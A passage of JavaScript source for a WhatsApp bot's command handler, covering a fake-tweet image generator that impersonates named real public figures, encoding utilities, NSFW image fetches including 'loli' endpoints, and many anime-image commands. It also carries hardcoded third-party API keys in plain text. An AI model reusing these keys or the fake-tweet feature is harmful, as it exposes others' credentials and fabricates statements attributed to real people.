        "donald-trump", "elon-musk", "jack-ma", "jeff-bezos",
        "joe-biden", "johnny-sins", "justin-bieber", "khaby-lame",
        "maher-zubair", "mark-zuckerberg", "mia-khalifa", "the-rock",
        "rihana", "taylor-swift", "tom-cruise", "tom-holland",
        "virat-kohli", "zendaya"
    ];
    
    if (!text) {
        const profileList = availableProfiles.map((name, index) => `${index + 1}. ${name}`).join('\n');
        return reply(`🐦 *ᴛᴡᴇᴇᴛ ɢᴇɴᴇʀᴀᴛᴏʀ*\n\n*ᴜsᴀɢᴇ:*\n.tweet <username> | <text>\n\n*ᴀᴠᴀɪʟᴀʙʟᴇ ᴘʀᴏғɪʟᴇs (26):*\n${profileList}\n\n*ᴇxᴀᴍᴘʟᴇ:*\n.tweet donaldo-trump | God bless America`);
    }
    
    const input = text.split("|");
    if (input.length < 2) {
        return reply(`❌ *ɪɴᴠᴀʟɪᴅ ғᴏʀᴍᴀᴛ*\n\n*ᴜsᴀɢᴇ:*\n.tweet <username> | <text>\n\n*ᴇxᴀᴍᴘʟᴇ:*\n.tweet elon-musk | Tesla! 🚀`);
    }
    
    const username = input[0].trim().toLowerCase().replace(/\s+/g, "-");
    const tweetText = input.slice(1).join("|").trim();
    
    if (!availableProfiles.includes(username)) {
        const profileList = availableProfiles.map((name, index) => `${index + 1}. ${name}`).join('\n');
        return reply(`❌ *ᴘʀᴏғɪʟᴇ ɴᴏᴛ ғᴏᴜɴᴅ*\n\n"${username}" ɪs ɴᴏᴛ ᴀᴠᴀɪʟᴀʙʟᴇ.\n\n*ᴘʟᴇᴀsᴇ ᴜsᴇ:*\n${profileList}`);
    }
    
    try {
        await empire.sendMessage(m.chat, {react: {text: '🐦', key: m.key}});
        
        console.log('📱 Generating tweet for:', username);
        console.log('💬 Tweet text:', tweetText);
        
        const axios = require('axios');
        const apiUrl = `https://api.nexoracle.com/xtweets/${encodeURIComponent(username)}?apikey=cf802ac56f7d63ac14&text=${encodeURIComponent(tweetText)}`;
        
        console.log('🔗 Fetching from:', apiUrl);
        
        const response = await axios.get(apiUrl, {
            responseType: 'arraybuffer'
        });
        
        const buffer = Buffer.from(response.data, 'binary');
        
        console.log('✅ Tweet image received, size:', buffer.length);
        
        await empire.sendMessage(m.chat, {
            image: buffer,
            caption: `🐦 *ᴛᴡᴇᴇᴛ ɢᴇɴᴇʀᴀᴛᴇᴅ*\n\n👤 *ᴜsᴇʀ:* @${username}\n💬 *ᴛᴇxᴛ:* ${tweetText}\n\n✨ ɢᴇɴᴇʀᴀᴛᴇᴅ ʙʏ ꜱʜᴀᴅᴏᴡxᴍᴅ ʙᴏᴛ`
        }, {quoted: m});
        
        await empire.sendMessage(m.chat, {react: {text: '✅', key: m.key}});
        console.log('✅ Tweet sent!');
        
    } catch (error) {
        console.error('❌ Error:', error.message);
        await empire.sendMessage(m.chat, {react: {text: '❌', key: m.key}});
        return reply(`❌ *ᴛᴡᴇᴇᴛ ɢᴇɴᴇʀᴀᴛɪᴏɴ ғᴀɪʟᴇᴅ*\n\n*ᴇʀʀᴏʀ:* ${error.message}`);
    }
}
break;

case "autoreact": {
    if (!isCreator) return m.reply("This command is restricted to owner only")
    if (!args[0]) return m.reply(".autoreact on/off");
  //  if (!m.isGroup) return m.reply("This command is restricted to groups only");

    if (args[0].toLowerCase() === "on") {
        setSetting(m.chat, "autoReact", true);
        m.reply(`✅ Auto React *enabled* in this group

`);
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.chat, "autoReact", false);
        m.reply("❌ Auto React *disabled* in this group");
    } else m.reply("Usage: autoreact on/off");
}
break;
case 'emojimix': {
  if (!text || !text.includes('+')) {
    return reply('ᴜsᴇ ғᴏʀᴍᴀᴛ: .emojimix 😭+😂')
  }
  
  const [emoji1, emoji2] = text.split('+').map(e => e.trim())
  const url = `https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`
  
  try {
    const res = await fetch(url)
    const json = await res.json()
    
    if (json.results && json.results[0]) {
      await empire.sendImageAsSticker(m.chat, json.results[0].url, m, {
        packname: global.packname,
        author: global.author
      })
    } else {
      reply('ᴇᴍᴏᴊɪ ᴄᴏᴍʙɪɴᴀᴛɪᴏɴ ɴᴏᴛ ғᴏᴜɴᴅ!')
    }
  } catch (err) {
    reply('ғᴀɪʟᴇᴅ ᴛᴏ ᴍɪx ᴇᴍᴏᴊɪs.')
  }
}
break
case "encode": {
   if (!isCreator) return;
    if (!args[0]) return reply("❌ Usage: encode type e.g base4 or binary hex or ceasar text")

    let type = args[0].toLowerCase()
    let input = args.slice(1).join(" ")

    if (!input) return reply("❌ Provide text to encode")

    let result

    switch (type) {

        case "base64":
            result = Buffer.from(input).toString("base64")
            break

        case "binary":
            result = input.split("")
                .map(c => c.charCodeAt(0).toString(2))
                .join(" ")
            break

        case "hex":
            result = Buffer.from(input).toString("hex")
            break

        case "caesar":
            let shift = 3
            result = input.split("").map(c => {
                let code = c.charCodeAt(0)
                return String.fromCharCode(code + shift)
            }).join("")
            break

        default:
            return reply("❌ Types: base64, binary, hex, caesar")
    }

    reply(`🔐 Encoded (${type}):\n\n${result}`)
}
break;
case "decode": {
    if (!args[0]) return reply("❌ Usage: decode type text")

    let type = args[0].toLowerCase()
    let input = args.slice(1).join(" ")

    if (!input) return reply("❌ Provide text to decode")

    let result

    try {
        switch (type) {

            case "base64":
                result = Buffer.from(input, "base64").toString("utf-8")
                break

            case "binary":
                result = input.split(" ")
                    .map(bin => String.fromCharCode(parseInt(bin, 2)))
                    .join("")
                break

            case "hex":
                result = Buffer.from(input, "hex").toString("utf-8")
                break

            case "caesar":
                let shift = 3
                result = input.split("").map(c => {
                    let code = c.charCodeAt(0)
                    return String.fromCharCode(code - shift)
                }).join("")
                break

            default:
                return reply("❌ Types: base64, binary, hex, caesar")
        }

        reply(`🔓 Decoded (${type}):\n\n${result}`)

    } catch (e) {
        reply("⚠️ Failed to decode. Invalid input.")
    }
}
break;
case 'morse': 
case 'morsecose': {
    if (!text) return reply("❌ 𝙿𝚕𝚎𝚊𝚜𝚎 𝚙𝚛𝚘𝚟𝚒𝚍𝚎 𝚝𝚎𝚡𝚝\n\n𝙴𝚡𝚊𝚖𝚙𝚕𝚎: .𝚖𝚘𝚛𝚜𝚎 SOS");

    const morseCode = {
        'a': '.-', 'b': '-...', 'c': '-.-.', 'd': '-..', 'e': '.',
        'f': '..-.', 'g': '--.', 'h': '....', 'i': '..', 'j': '.---',
        'k': '-.-', 'l': '.-..', 'm': '--', 'n': '-.', 'o': '---',
        'p': '.--.', 'q': '--.-', 'r': '.-.', 's': '...', 't': '-',
        'u': '..-', 'v': '...-', 'w': '.--', 'x': '-..-', 'y': '-.--',
        'z': '--..',
        '0': '-----', '1': '.----', '2': '..---', '3': '...--',
        '4': '....-', '5': '.....', '6': '-....', '7': '--...',
        '8': '---..', '9': '----.',
        ' ': '/'
    };

    const textToMorse = text.toLowerCase().split('').map(char => morseCode[char] || '').join(' ');

    reply(`📡 *𝙼𝙾𝚁𝚂𝙴 𝙴𝙽𝙲𝙾𝙳𝙴𝙳*\n\n${textToMorse}`);
}
break;
case 'frommorse': {
    if (!text) return reply("❌ 𝙿𝚛𝚘𝚟𝚒𝚍𝚎 𝚖𝚘𝚛𝚜𝚎 𝚌𝚘𝚍𝚎\n\n𝙴𝚡𝚊𝚖𝚙𝚕𝚎: .𝚏𝚛𝚘𝚖𝚖𝚘𝚛𝚜𝚎 .... . .-.. .-.. ---");

    const morseCode = {
        '.-': 'a', '-...': 'b', '-.-.': 'c', '-..': 'd', '.': 'e',
        '..-.': 'f', '--.': 'g', '....': 'h', '..': 'i', '.---': 'j',
        '-.-': 'k', '.-..': 'l', '--': 'm', '-.': 'n', '---': 'o',
        '.--.': 'p', '--.-': 'q', '.-.': 'r', '...': 's', '-': 't',
        '..-': 'u', '...-': 'v', '.--': 'w', '-..-': 'x', '-.--': 'y',
        '--..': 'z',
        '-----': '0', '.----': '1', '..---': '2', '...--': '3',
        '....-': '4', '.....': '5', '-....': '6', '--...': '7',
        '---..': '8', '----.': '9',
        '/': ' '
    };

    const morseToText = text.split(' ').map(code => morseCode[code] || '').join('');

    reply(`📡 *𝙼𝙾𝚁𝚂𝙴 𝙳𝙴𝙲𝙾𝙳𝙴𝙳*\n\n${morseToText}`);
}
break;


case 'passchecker':
case 'checkpass':
case 'checkpassword': {
  if (!text) return reply("Example: .passchecker MyPassword123");
  
  let strength = 0;
  if (text.length >= 8) strength++;
  if (/[A-Z]/.test(text)) strength++;
  if (/[0-9]/.test(text)) strength++;
  if (/[^A-Za-z0-9]/.test(text)) strength++;
  
  let rating = ["Very Weak", "Weak", "Medium", "Strong", "Very Strong"][strength];
  let emoji = ["💀", "😰", "😐", "👍", "💪"][strength];
  
  reply(`🔐 Password Strength: ${emoji} *${rating}*
Length: ${text.length} characters
Contains uppercase: ${/[A-Z]/.test(text) ? '✅' : '❌'}
Contains numbers: ${/[0-9]/.test(text) ? '✅' : '❌'}
Contains symbols: ${/[^A-Za-z0-9]/.test(text) ? '✅' : '❌'}`);
}
break;
case 'delete':
case 'del': {
  if (!isCreator) return;
  if (!m.quoted) return reply("ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ ᴛᴏ ᴅᴇʟᴇᴛᴇ ɪᴛ.");

  empire.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: false,
      id: m.quoted.id,
      participant: m.quoted.sender
    }
  });
}
break;
case 'afk': {
    if (!isCreator) return reply("🔱 Owner clearance required to toggle global AFK status.");
    
    const fs = require('fs');
    const afkBannerPath = getRandomImage('./media/banners/');
    const afkBuffer = fs.readFileSync(afkBannerPath);

    global.afkTime = global.afkTime || {};
    const reason = q ? q : "No reason provided";
    
    // Set AFK data
    global.afkTime[m.sender] = {
        time: Date.now(),
        reason: reason
    };

    const afkMsg = `*── 「 NEXORA AFK MODE 」 ──*\n\n` +
                   `👤 *User:* ${m.pushName}\n` +
                   `🌙 *Status:* Currently AFK\n` +
                   `📝 *Reason:* ${reason}\n\n` +
                   `_Take care...._`;

    await empire.sendMessage(m.chat, {
        image: afkBuffer,
        caption: afkMsg,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: "SYSTEM: AFK ACTIVATED",
                body: "Nexora Presence Management",
                thumbnail: afkBuffer,
                sourceUrl: "https://wa.me/2349168095230",
                mediaType: 1,
               renderLargerThumbnail: false
            }
        }
    }, { quoted: m });
    
    await empire.sendMessage(m.chat, { react: { text: '💤', key: m.key } });
}
break;

case 'setmood': {
    if (!isCreator) return reply("❌ Only my Owner can change my mood! 🫰🩸");
    if (!text) return reply(`Usage: ${prefix}setmood Happy ☺️`);
    
    global.botMood = text; // This saves the mood until the bot restarts
    await empire.sendMessage(m.chat, { react: { text: '🎭', key: m.key } });
    reply(`✅  📢Nexora Mood updated to: ${text}`);
}
break;


case 'setbotname': {
    //   if (!isPremium) return reply("⭐ THIS COMMAND IS FOR PREMIUM USERS ONLY use .buyprem to get yours ");
    if (!isCreator) return reply("❌ Only my Owner command");
    
    if (!text) return reply(`Usage: ${prefix}setbotname Awal xd`);
    
    global.botName = text; // This saves the mood until the bot restarts
    await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    reply(`✅  \`Bot Name updated to\`: ${text}`);
}
break;

case 'myip': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
  try {
    const res = await axios.get('https://api.ipify.org?format=json', { timeout: 120000 })
    const ip = res?.data?.ip || null
    if (!ip) return reply(`💧 Failed to fetch IP\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

    reply(`┏━━━━━━━━━━━━━─╮
┃  🌐 PUBLIC IP
┃  💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †
╰──────────────╯

${ip}`)
  } catch (err) {
    console.log('myip error:', err)
    reply(`❌ Failed to get IP address\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  }
}
break

case 'calculate':
case 'calc': {
  if (!text) return reply(`Example: ${prefix}calculate 7*8+2\n\n💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

  try {
    const clean = text.replace(/[^0-9+\-*/().% ]/g, '')
    if (!clean) return reply(`💧 Invalid expression\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

    const result = Function(`"use strict"; return (${clean})`)()

    reply(`┏━━━━━━━━━━━━━─╮
┃  🧮 CALCULATOR
┃  💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †
╰──────────────╯

Expression: ${clean}
Result: ${result}`)
  } catch (err) {
    console.log('calculate error:', err)
    reply(`❌ Failed to calculate expression\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  }
}
break
case 'poll': {
     if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
       if (!m.isGroup) return reply('Group only')
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
return await reply(
`State the question and at least 2 options\nExample: ${prefix}Is Nexora MD v3 the best bot?|yes,no, maybe...`
)
            let options = []
            for (let i of opt.split(',')) {
options.push(i)
            }
            await empire.sendMessage(m.chat, {
poll: {
name: poll,
values: options
}
            })
        }
        break;
case 'cry': case 'kill': case 'hug': case 'pat': case 'lick':
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile':
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp':
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive':
case 'shinobu': case 'handhold': {
  axios.get(`https://api.waifu.pics/sfw/${command}`)
    .then(({data}) => {
      empire.sendImageAsSticker(from, data.url, m, { 
        packname: global.packname, 
        author: global.author 
      })
    })
}
break



case 'waifu' :

waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
empire.sendMessage(from, {image: {url:waifudd.data.url},caption:`Your waifu By Nexora MD v3 💧 Enjoy`}, { quoted:m }).catch(err => {
 return('Error!')
})
break;      
case "nsfw": {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
    try {
        const res = await axios.get("https://prexzyapis.com/random/anhnsfw");
        const img = res.data?.message;
        if (!img) return m.reply("❌ Could not fetch a nsfw image.");
        await empire.sendMessage(
            m.chat,
            { image: { url: img }, caption: "🍑 Random Nsfw!" },
            { quoted: m }
        );
    } catch (e) {
        console.error("NFSW ERROR:", e);
        m.reply("❌ Failed to fetch a nsfw image.");
    }
}
break;  


case 'akiyama': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/akiyama' }}, { quoted: m })
}
break;

case 'ana': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/ana' }}, { quoted: m })
}
break;

case 'art': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/art' }}, { quoted: m })
}
break;

case 'asuna': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/asuna' }}, { quoted: m })
}
break;

case 'ayuzawa': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/ayuzawa' }}, { quoted: m })
}
break;

case 'boruto': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/boruto' }}, { quoted: m })
}
break;

case 'bts': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/bts' }}, { quoted: m })
}
break;

case 'cecan': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/cecan' }}, { quoted: m })
}
break;

case 'chiho': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/chiho' }}, { quoted: m })
}
break;

case 'chitoge': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/chitoge' }}, { quoted: m })
}
break;

case 'cogan': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/cogan' }}, { quoted: m })
}
break;

case 'cosplay': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/cosplay' }}, { quoted: m })
}
break;

case 'cosplayloli': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/cosplayloli' }}, { quoted: m })
}
break;

case 'cosplaysagiri': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/cosplaysagiri' }}, { quoted: m })
}
break;

case 'cyber': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/cyber' }}, { quoted: m })
}
break;

case 'deidara': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/deidara' }}, { quoted: m })
}
break;

case 'doraemon': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/doraemon' }}, { quoted: m })
}
break;

case 'elaina': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/elaina' }}, { quoted: m })
}
break;

// ...continues for all 100+ commands ...
case 'emilia': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/emilia' }}, { quoted: m })
}
break;

case 'erza': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/erza' }}, { quoted: m })
}
break;

case 'exo': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/exo' }}, { quoted: m })
}
break;

case 'femdom': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/femdom' }}, { quoted: m })
}
break;

case 'freefire': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/freefire' }}, { quoted: m })
}
break;

case 'gamewallpaper': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/gamewallpaper' }}, { quoted: m })
}
break;

case 'glasses': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/glasses' }}, { quoted: m })
}
break;

case 'gremory': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/gremory' }}, { quoted: m })
}
break;

case 'hacker': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/hacker' }}, { quoted: m })
}
break;

case 'hestia': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/hestia' }}, { quoted: m })
}
break;

case 'husbu': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/husbu' }}, { quoted: m })
}
break;

case 'inori': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/inori' }}, { quoted: m })
}
break;

case 'islamic': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/islamic' }}, { quoted: m })
}
break;

case 'isuzu': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/isuzu' }}, { quoted: m })
}
break;

case 'itachi': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/itachi' }}, { quoted: m })
}
break;

case 'itori': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/itori' }}, { quoted: m })
}
break;

case 'jennie': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/jennie' }}, { quoted: m })
}
break;

case 'jiso': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/jiso' }}, { quoted: m })
}
break;

case 'justina': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/justina' }}, { quoted: m })
}
break;

case 'kaga': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/kaga' }}, { quoted: m })
}
break;

case 'kagura': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/kagura' }}, { quoted: m })
}
break;

case 'kakashi': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/kakashi' }}, { quoted: m })
}
break;

case 'kaori': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/kaori' }}, { quoted: m })
}
break;

case 'cartoon': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/cartoon' }}, { quoted: m })
}
break;

case 'shortquote': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/shortquote' }}, { quoted: m })
}
break;

case 'loli': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/loli' }}, { quoted: m })
}
break;

case 'madara': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/madara' }}, { quoted: m })
}
break;

case 'megumin': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/megumin' }}, { quoted: m })
}
break;

case 'mikasa': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/mikasa' }}, { quoted: m })
}
break;

case 'mikey': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/mikey' }}, { quoted: m })
}
break;

case 'miku': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/miku' }}, { quoted: m })
}
break;

case 'minato': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/minato' }}, { quoted: m })
}
break;

case 'mobile': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/mobile' }}, { quoted: m })
}
break;

case 'motor': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/motor' }}, { quoted: m })
}
break;

case 'mountain': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/mountain' }}, { quoted: m })
}
break;

case 'naruto': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/naruto' }}, { quoted: m })
}
break;


case 'neko': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/neko' }}, { quoted: m })
}
break;

case 'neko2': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/neko2' }}, { quoted: m })
}
break;

case 'nekonime': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/nekonime' }}, { quoted: m })
}
break;

case 'nezuko': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/nezuko' }}, { quoted: m })
}
break;

case 'onepiece': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/onepiece' }}, { quoted: m })
}
break;

case 'pentol': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/pentol' }}, { quoted: m })
}
break;

case 'pokemon': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/pokemon' }}, { quoted: m })
}
break;

case 'profil': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/profil' }}, { quoted: m })
}
break;

case 'programming': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/programming' }}, { quoted: m })
}
break;

case 'pubg': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/pubg' }}, { quoted: m })
}
break;

case 'randblackpink': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/randblackpink' }}, { quoted: m })
}
break;

case 'randomnime': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/randomnime' }}, { quoted: m })
}
break;

case 'randomnime2': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/randomnime2' }}, { quoted: m })
}
break;

case 'rize': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/rize' }}, { quoted: m })
}
break;

case 'rose': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/rose' }}, { quoted: m })
}
break;

case 'ryujin': {
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/ryujin' }}, { quoted: m })
}
break;

case 'sagiri': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/sagiri' }}, { quoted: m })
}
break;

case 'sakura': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/sakura' }}, { quoted: m })
}
break;

case 'sasuke': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/sasuke' }}, { quoted: m })
}
break;

case 'satanic': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/satanic' }}, { quoted: m })
}
break;

case 'shina': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/shina' }}, { quoted: m })
}
break;

case 'shinka': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/shinka' }}, { quoted: m })
}
break;

case 'shinomiya': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
